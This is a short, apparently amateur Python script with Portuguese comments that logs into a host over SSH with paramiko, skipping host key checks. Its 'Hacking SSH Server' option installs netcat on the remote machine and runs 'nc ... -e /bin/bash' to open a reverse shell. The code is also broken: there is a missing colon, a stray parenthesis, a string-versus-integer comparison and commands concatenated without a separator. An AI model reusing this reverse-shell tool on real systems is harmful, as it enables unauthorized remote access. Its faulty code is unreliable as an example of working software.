import paramiko



host = input('Enter host: ')
user = input('Enter username: ')
passwd = input('Enter password: ')

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #Conecta em conexões SSH sem verificar a chave do host
c.connect(host, username=user, password=passwd) #Passa os parâmetros para a conexão SSH



def exe_terminal()
    print("Connected to the SSH server. You can now execute commands...\n")
    choose = input ("Choose one: [1] - Free Texting [2] - Hacking SSH Server"))
    if choose == 2:
        port = input("Enter the Port: ")
        cmd = ("sudo apt update && sudo apt install netcat-traditional -y" + f"nc {host} {port} -e /bin/bash") #Comando para instalar o netcat-traditional e criar a conexão reversa"
        stdin, stdout, stderr =c.exec_command(cmd)
        print("Starting reverse shell...")           #No seu terminal nc -lvp e a porta que você escolheu para receber a conexão reversa
        while True:
            output = stdout.readline()
            if output:
                print(output.strip())
            error = stderr.readline()
            if error:
                print(error.strip())
               